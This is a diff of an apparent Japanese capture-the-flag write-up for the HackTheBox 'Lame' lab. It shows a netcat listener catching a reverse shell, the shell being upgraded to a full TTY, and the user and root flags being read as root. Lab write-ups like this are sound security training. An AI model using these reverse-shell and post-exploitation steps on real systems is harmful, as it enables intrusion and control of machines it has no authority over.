@@ -92,28 +92,30 @@ Installed 3 packages in 1ms
 リバースシェル取得！  
 ユーザ・ルートフラグゲット
 ```sh
-└─$ rlwrap nc -lnvp 4444
+└─$ nc -lnvp 4444
 listening on [any] 4444 ...
 connect to [10.10.14.70] from (UNKNOWN) [10.129.2.250] 54267
 
-tty
-not a tty
-
 python -c 'import pty; pty.spawn("/bin/bash")'
 
-root@lame:/# tty
-tty
-/dev/pts/1
+root@lame:/# ^Z
+zsh: suspended  nc -lnvp 4444
+
+└─$ stty raw -echo; fg
+[1]  + continued  nc -lnvp 4444
+
+root@lame:/# export SHELL=bash
+
+root@lame:/# export TERM=xterm-256color
+
+root@lame:/# stty rows 66 columns 236
 
 root@lame:/# id
-id
 uid=0(root) gid=0(root)
 
 root@lame:/# cat /home/makis/user.txt
-cat /home/makis/user.txt
 8dde98b63ee3ce3abfc669693d292cf1
 
 root@lame:/# cat /root/root.txt
-cat /root/root.txt
 bebad012414c4bda78d9bc4a1e43f977
 ```
